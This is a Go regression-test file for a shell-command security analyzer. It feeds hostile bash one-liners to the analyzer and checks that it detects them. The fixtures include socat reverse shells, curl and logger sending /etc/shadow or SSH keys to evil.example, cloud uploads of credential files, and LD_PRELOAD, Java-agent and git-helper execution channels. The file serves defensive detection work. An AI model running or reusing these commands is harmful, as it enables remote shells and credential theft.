package analysis

// Regression tests for the binder findings of security-review.md (F11, F14,
// F25, F27, F28, F31, F34, F36, F42, F44, F45, F65, F68 and F71). Each test
// reproduces the documented payload and asserts the corrected verdict, so a
// future change that reopens a finding fails here with the finding's number.
// Helpers (mustAnalyzer, effectOn, mustEffect, mustGradeAtLeast, hasKind) live
// in security_review_test.go and review_fixes_test.go.

import (
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// TestFinding011PatchStdinWrites pins F11: `patch` applied to a diff stream
// rewrites the files named in the diff's headers, so the invocation carries an
// FSWrite even when no TARGET operand names them — over the unresolved target,
// since the names come from data.
func TestFinding011PatchStdinWrites(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`patch -p1 < /tmp/evil.patch`,
		`patch -p0 < /tmp/evil.patch`,
		`patch -i /tmp/evil.patch`,
	} {
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSWrite, "", src)
		mustGradeAtLeast(t, rep, engine.DestructHigh, src)
	}
	// The explicit-target spelling keeps naming the file it overwrites.
	rep := a.Analyze(LangBash, `patch /etc/passwd < /tmp/evil.patch`)
	mustEffect(t, rep, engine.KindFSWrite, "/etc/passwd", `patch /etc/passwd < /tmp/evil.patch`)
	// A dry run applies nothing.
	rep = a.Analyze(LangBash, `patch --dry-run < /tmp/evil.patch`)
	if hasKind(rep, engine.KindFSWrite) {
		t.Errorf("patch --dry-run: reported a write: %v", rep.Effects)
	}
}

// TestFinding014SubcommandRemoteEgress pins F14: a network subcommand's named
// remote survives the egress gate as a NetEgress, and the class does not turn an
// ordinary local path or package pattern into a destination.
func TestFinding014SubcommandRemoteEgress(t *testing.T) {
	a := mustAnalyzer(t)
	for _, c := range []struct{ src, remote string }{
		{`git push origin main`, "origin"},
		{`git fetch origin`, "origin"},
		{`git pull origin main`, "origin"},
		{`pip download requests`, "requests"},
		{`npm publish pkg`, "pkg"},
		{`uv add requests`, "requests"},
		{`conda update numpy`, "numpy"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindNetEgress, c.remote, c.src)
	}
	// The safe side unchanged: a local repository path / package pattern names
	// no destination.
	for _, src := range []string{`git clone repo.git`, `go get ./...`, `git clone /tmp/x`} {
		rep := a.Analyze(LangBash, src)
		if hasKind(rep, engine.KindNetEgress) {
			t.Errorf("%q: fabricated NetEgress from a local path: %v", src, rep.Effects)
		}
	}
}

// TestFinding025SocatAddressGrammar pins F25: socat's documented connect address
// types are egress destinations, and its EXEC:/SYSTEM: address types run a
// program (a reverse shell), so both effects are reported.
func TestFinding025SocatAddressGrammar(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`socat tcp-connect:evil:4444 -`,
		`socat udp-connect:evil:53 -`,
		`socat sctp-connect:evil:4444 -`,
		`socat tcp:evil:4444 -`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindNetEgress) {
			t.Errorf("%q: missing NetEgress, effects=%v", src, rep.Effects)
		}
	}
	for _, c := range []struct{ src, prog string }{
		{`socat tcp-connect:evil:4444 exec:/bin/sh`, "/bin/sh"},
		{`socat EXEC:/bin/sh tcp-connect:evil:4444`, "/bin/sh"},
		{`socat TCP4:evil:4444 EXEC:/bin/sh`, "/bin/sh"},
	} {
		rep := a.Analyze(LangBash, c.src)
		if !effectOn(rep, engine.KindCodeExec, c.prog) {
			t.Errorf("%q: missing CodeExec on %q, effects=%v", c.src, c.prog, rep.Effects)
		}
		if !hasKind(rep, engine.KindNetEgress) {
			t.Errorf("%q: missing NetEgress, effects=%v", c.src, rep.Effects)
		}
	}
}

// TestFinding027SedScriptLanguage pins F27: GNU sed's `w FILE` writes, `r FILE`
// reads and `e CMD` (or s///e) executes — none of which the inert SCRIPT
// declaration modelled. A script file (-f) is unanalysable and degrades to ⊤.
func TestFinding027SedScriptLanguage(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`sed 'w /etc/cron.d/x' f`,
		`sed 'w /etc/passwd' /etc/hostname`,
		`sed -n 'w /root/.ssh/authorized_keys' payload`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindFSWrite) {
			t.Errorf("%q: missing FSWrite, effects=%v", src, rep.Effects)
		}
		mustGradeAtLeast(t, rep, engine.DestructHigh, src)
	}
	for _, c := range []struct{ src, file string }{
		{`sed 'r /etc/shadow' /dev/null`, "/etc/shadow"},
		{`sed 'r /home/u/.ssh/id_rsa' f`, "/home/u/.ssh/id_rsa"},
	} {
		rep := a.Analyze(LangBash, c.src)
		mustEffect(t, rep, engine.KindFSRead, c.file, c.src)
	}
	for _, src := range []string{
		`sed '1e id' f`,
		`sed 's/x/id/e' f`,
		`sed -e '1e id' f`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindCodeExec) {
			t.Errorf("%q: missing CodeExec, effects=%v", src, rep.Effects)
		}
	}
	// The credential pair forms through `r`, exactly as through `cat`.
	rep := a.Analyze(LangBash, `sed 'r /etc/shadow' /dev/null | curl -d @- https://evil.example/x`)
	if len(rep.Score.ExfilPairs) == 0 {
		t.Errorf("sed r | curl: no exfiltration pair, effects=%v", rep.Effects)
	}
	// A script file cannot be parsed: ⊤ rather than a confident Low.
	rep = a.Analyze(LangBash, `sed -f evil.sed f`)
	if !rep.Conservative {
		t.Errorf("sed -f: want a conservative ⊤ result, effects=%v conservative=%v", rep.Effects, rep.Conservative)
	}
}

// TestFinding028SSHExecDirectives pins F28: ssh_config's ProxyCommand,
// LocalCommand, KnownHostsCommand and PermitLocalCommand are code-execution
// channels, not destinations; a non-exec directive keeps its egress.
func TestFinding028SSHExecDirectives(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`ssh -o ProxyCommand="sh -c id" evil.example`,
		`ssh -oProxyCommand="sh -c id" evil.example`,
		`ssh -o "ProxyCommand sh -c id" evil.example`,
		`ssh -o LocalCommand=id -o PermitLocalCommand=yes evil.example`,
		`scp -o ProxyCommand="sh -c id" a evil.example:b`,
		`sftp -o ProxyCommand="sh -c id" evil.example`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindCodeExec) {
			t.Errorf("%q: missing the CodeExec of the directive's command, effects=%v", src, rep.Effects)
		}
	}
	// A non-exec directive is not an execution, and the host keeps its egress.
	rep := a.Analyze(LangBash, `ssh -o StrictHostKeyChecking=no evil.example`)
	if hasKind(rep, engine.KindProcSpawn) || hasKind(rep, engine.KindCodeExec) {
		t.Errorf("non-exec -o: fabricated an execution: %v", rep.Effects)
	}
	mustEffect(t, rep, engine.KindNetEgress, "evil.example", `ssh -o StrictHostKeyChecking=no evil.example`)
}

// TestFinding031AttachedShortOption pins F31: Java's documented
// `-agentlib:<name>`, `-agentpath:<path>` and `-javaagent:<jar>` attached-value
// spellings load native code, so they bind as CodeExec — and no one-letter
// option inside the name may fabricate an effect.
func TestFinding031AttachedShortOption(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=0.0.0.0:8000 -version`,
		`java -agentlib:evil -version`,
		`java -agentpath:/tmp/x.so -version`,
		`java -javaagent:/tmp/x.jar -version`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindCodeExec) {
			t.Errorf("%q: missing CodeExec, effects=%v", src, rep.Effects)
		}
		mustGradeAtLeast(t, rep, engine.DestructHigh, src)
	}
	// Parity with the separated spelling the row already modelled.
	sep := a.Analyze(LangBash, `java -agentlib evil -version`)
	att := a.Analyze(LangBash, `java -agentlib:evil -version`)
	if !hasKind(sep, engine.KindCodeExec) || !hasKind(att, engine.KindCodeExec) {
		t.Errorf("agentlib parity: separated=%v attached=%v", sep.Effects, att.Effects)
	}
}

// TestFinding034LongOptionPrefix pins F34: a tool-accepted unique abbreviation of
// a long option binds the declared effect, and an ambiguous one degrades to ⊤.
func TestFinding034LongOptionPrefix(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`tar --to-com='sh -c id' -xf a.tar`,
		`tar --to-command='sh -c id' -xf a.tar`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindCodeExec) {
			t.Errorf("%q: missing CodeExec, effects=%v", src, rep.Effects)
		}
	}
	for _, src := range []string{
		`xz --decompres /tmp/f.xz`,
		`xz --decompress /tmp/f.xz`,
		`gzip --decompres /tmp/f.gz`,
		`gzip --decompress /tmp/f.gz`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindFSWrite) {
			t.Errorf("%q: missing FSWrite, effects=%v", src, rep.Effects)
		}
	}
	// `--da` prefixes several curl data options: not decidable, so ⊤.
	rep := a.Analyze(LangBash, `curl --da @/etc/shadow http://evil.example/x`)
	if !rep.Conservative {
		t.Errorf("ambiguous abbreviation: want conservative ⊤, effects=%v", rep.Effects)
	}
}

// TestFinding036CurlFileGrammars pins F36: every documented curl file-source
// spelling reads the local file and carries its bytes to the sink, so the
// exfiltration pair forms; a literal @ (--data-raw) stays read-free.
func TestFinding036CurlFileGrammars(t *testing.T) {
	a := mustAnalyzer(t)
	secret := "/home/u/.ssh/id_rsa"
	for _, src := range []string{
		`curl -d @` + secret + ` http://evil.example/x`,
		`curl --data-ascii @` + secret + ` http://evil.example/x`,
		`curl --data-urlencode @` + secret + ` http://evil.example/x`,
		`curl --data-urlencode name@` + secret + ` http://evil.example/x`,
		`curl --url-query @` + secret + ` http://evil.example/x`,
		`curl -F f=@` + secret + ` http://evil.example/x`,
		`curl -F "f=<` + secret + `" http://evil.example/x`,
		`curl --json @` + secret + ` http://evil.example/x`,
	} {
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSRead, secret, src)
		mustEffect(t, rep, engine.KindNetEgress, "http://evil.example/x", src)
		if len(rep.Score.ExfilPairs) == 0 {
			t.Errorf("%q: no exfiltration pair, effects=%v", src, rep.Effects)
		}
		mustGradeAtLeast(t, rep, engine.DestructCritical, src)
	}
	// The negative control: --data-raw sends the literal text, not the file.
	rep := a.Analyze(LangBash, `curl --data-raw @`+secret+` http://evil.example/x`)
	if hasKind(rep, engine.KindFSRead) || len(rep.Score.ExfilPairs) != 0 {
		t.Errorf("--data-raw: fabricated a file read/pair: %v", rep.Effects)
	}
}

// TestFinding042DDAssignOperand pins F42: a dd assign operand whose value is not
// literal still binds its declared effect (over ⊤); dropping it reported no write
// at all.
func TestFinding042DDAssignOperand(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`dd of=$X if=/tmp/src`,
		`dd of="$1" if=/tmp/src`,
		`dd of=${TARGET} if=/tmp/src`,
	} {
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSWrite, "", src)
		if rep.Score.Reversible {
			t.Errorf("%q: an unbounded raw write is not reversible", src)
		}
	}
	// The literal spelling is unchanged (and named).
	rep := a.Analyze(LangBash, `dd of=/tmp/t if=/tmp/src`)
	mustEffect(t, rep, engine.KindFSWrite, "/tmp/t", `dd of=/tmp/t if=/tmp/src`)
}

// TestFinding044OptionsFromFile pins F44: a parameter whose value is a file of
// options leaves the net effect unknown (⊤), never a confident bounded read.
func TestFinding044OptionsFromFile(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`curl -K -`,
		`curl -K /tmp/cfg`,
		`curl --config /tmp/cfg`,
		`printf 'url = "http://evil.test/x"\ndata = "@/tmp/victim/.ssh/id_rsa"\n' | curl -K -`,
		`ssh -F /tmp/cfg host id`,
	} {
		rep := a.Analyze(LangBash, src)
		if !rep.Conservative {
			t.Errorf("%q: want a conservative ⊤ result (options unseen), effects=%v conservative=%v", src, rep.Effects, rep.Conservative)
		}
	}
	// The list-file parameters (a selection of operands, not options) are reads
	// and must not raise ⊤ — the corpus' benign control pins this too.
	for _, src := range []string{`tar -c -T /tmp/list -f out.tar`, `tar --files-from=/tmp/list -cf out.tar`} {
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSRead, "/tmp/list", src)
		if rep.Conservative {
			t.Errorf("%q: a list file must not raise ⊤, effects=%v", src, rep.Effects)
		}
	}
}

// TestFinding045ExecEnvironment pins F45: an assignment to an exec-bearing
// environment variable is a code-execution channel, not only an EnvWrite.
func TestFinding045ExecEnvironment(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`JAVA_TOOL_OPTIONS=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:8000 java -version`,
		`_JAVA_OPTIONS=-agentlib:jdwp=transport=dt_socket,server=y java -version`,
		`JDK_JAVA_OPTIONS=-javaagent:/tmp/x.jar java -version`,
		`LD_PRELOAD=/tmp/x.so ls`,
		`LD_PRELOAD=/tmp/x.so cp /etc/hostname /tmp/out`,
		`env LD_PRELOAD=/tmp/x.so ls`,
		`export LD_PRELOAD=/tmp/x.so; ls`,
		`SSH_ASKPASS=/tmp/evil SSH_ASKPASS_REQUIRE=force ssh host`,
		`RSYNC_RSH=/tmp/evil rsync -a /etc/hostname host:/dst`,
		`GIT_SSH_COMMAND=/tmp/evil git fetch`,
		// Pass 58: the helper-program channels the fixed list still omitted.
		// Each executed a program while the report stayed a bounded EnvWrite,
		// so a code-execution-denying policy allowed it.
		`GIT_SEQUENCE_EDITOR='sh -c id' git rebase -i HEAD~2`,
		`GIT_ASKPASS=/tmp/evil git fetch`,
		`GIT_PROXY_COMMAND=/tmp/evil git clone git://host/x`,
		`SUDO_ASKPASS=/tmp/evil sudo -A id`,
		`SYSTEMD_EDITOR=/tmp/evil systemctl edit foo`,
		`KUBECTL_EXTERNAL_DIFF=/tmp/evil kubectl diff`,
		`TAR_OPTIONS='--checkpoint-action=exec=sh' tar cf /tmp/a.tar /tmp/x`,
		`TAR_OPTIONS='--use-compress-program=/tmp/evil' tar cf /tmp/a.tar /tmp/x`,
		`GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager GIT_CONFIG_VALUE_0='sh -c id' git log`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindCodeExec) {
			t.Errorf("%q: missing CodeExec, effects=%v", src, rep.Effects)
		}
		if !hasKind(rep, engine.KindEnvWrite) {
			t.Errorf("%q: the environment write disappeared, effects=%v", src, rep.Effects)
		}
	}
	// The inert baseline is untouched.
	rep := a.Analyze(LangBash, `java -version`)
	if hasKind(rep, engine.KindCodeExec) || hasKind(rep, engine.KindProcSpawn) {
		t.Errorf("java -version: fabricated an execution: %v", rep.Effects)
	}
}

// TestFinding065ProcSpawnFallback pins F65: a read-only option must not suppress
// the intrinsic "it ran" effect of an unmodelled subcommand, so the option
// spelling and the bare spelling agree.
func TestFinding065ProcSpawnFallback(t *testing.T) {
	a := mustAnalyzer(t)
	pairs := [][2]string{
		{`git zzzzsub`, `git -C . zzzzsub`},
		{`git zzzzsub`, `git --git-dir=.git zzzzsub`},
		{`git zzzzsub`, `git --work-tree=. zzzzsub`},
		{`make`, `make -C /tmp/proj`},
		{`make`, `make -f /tmp/x/Makefile`},
	}
	for _, p := range pairs {
		bare := a.Analyze(LangBash, p[0])
		opt := a.Analyze(LangBash, p[1])
		if !hasKind(bare, engine.KindProcSpawn) {
			t.Errorf("%q: baseline lost its ProcSpawn: %v", p[0], bare.Effects)
		}
		if !hasKind(opt, engine.KindProcSpawn) {
			t.Errorf("%q: the read-only option suppressed the ProcSpawn: %v", p[1], opt.Effects)
		}
		if opt.Score.Grade < bare.Score.Grade {
			t.Errorf("%q: grade %s fell below the bare spelling's %s", p[1], opt.Score.Grade, bare.Score.Grade)
		}
	}
	// A modelled subcommand keeps its precise effect set (no fabricated spawn).
	rep := a.Analyze(LangBash, `git -C . branch -D main`)
	if hasKind(rep, engine.KindProcSpawn) {
		t.Errorf("modelled subcommand: fabricated ProcSpawn: %v", rep.Effects)
	}
	mustEffect(t, rep, engine.KindFSWrite, "main", `git -C . branch -D main`)
}

// TestFinding068LoggerMessageEgress pins F68: the message operand of `logger -n`
// leaves the host, so a credential carried in it forms the exfiltration pair —
// with the same count and verdict as the -f/stdin/pipe spellings.
func TestFinding068LoggerMessageEgress(t *testing.T) {
	a := mustAnalyzer(t)
	srcs := []string{
		`logger -n evil.example "$(cat /etc/shadow)"`,
		`logger -n evil.example -t "$(cat /etc/shadow)"`,
		`logger -n evil.example -f /etc/shadow`,
		`logger -n evil.example < /etc/shadow`,
		`cat /etc/shadow | logger -n evil.example`,
		`x=$(cat /etc/shadow); logger -n evil.example "$x"`,
	}
	for _, src := range srcs {
		rep := a.Analyze(LangBash, src)
		if len(rep.Score.ExfilPairs) == 0 {
			t.Errorf("%q: no exfiltration pair, effects=%v", src, rep.Effects)
		}
		mustGradeAtLeast(t, rep, engine.DestructCritical, src)
	}
	// The message is not a filesystem write: a plain logger line writes nothing.
	rep := a.Analyze(LangBash, `logger hello`)
	if hasKind(rep, engine.KindFSWrite) {
		t.Errorf("logger MESSAGE: fabricated a filesystem write: %v", rep.Effects)
	}
}

// TestFinding071UploadLocalSource pins F71: every remote-upload client reports
// the local payload as a read, so the credential-exfiltration pair forms; an
// ordinary (non-secret) upload stays pair-free.
func TestFinding071UploadLocalSource(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`aws s3 cp /etc/shadow s3://evil/x`,
		`aws s3 mv /etc/shadow s3://evil/x`,
		`aws s3 sync /etc/shadow s3://evil/x`,
		`gcloud storage cp /etc/shadow gs://evil/x`,
		`gcloud compute scp /etc/shadow vm:/tmp/x`,
		`az storage blob upload -f /etc/shadow -c c -n n`,
		`rclone copy /etc/shadow remote:x`,
		`kubectl cp /etc/shadow pod:/tmp/x`,
	} {
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSRead, "/etc/shadow", src)
		if len(rep.Score.ExfilPairs) == 0 {
			t.Errorf("%q: no exfiltration pairing for a credential upload, effects=%v", src, rep.Effects)
		}
	}
	// kubectl cp's source side is a read, not a write.
	rep := a.Analyze(LangBash, `kubectl cp /etc/shadow pod:/tmp/x`)
	if effectOn(rep, engine.KindFSWrite, "/etc/shadow") {
		t.Errorf("kubectl cp: the source side is still reported as a write: %v", rep.Effects)
	}
	// Benign uploads read their file but form no pair.
	for _, src := range []string{
		`aws s3 cp /tmp/app.tar.gz s3://mybucket/app.tar.gz`,
		`kubectl cp /tmp/app.log pod:/tmp/app.log`,
	} {
		rep := a.Analyze(LangBash, src)
		if len(rep.Score.ExfilPairs) != 0 {
			t.Errorf("%q: fabricated an exfiltration pair: %v", src, rep.Effects)
		}
	}
}
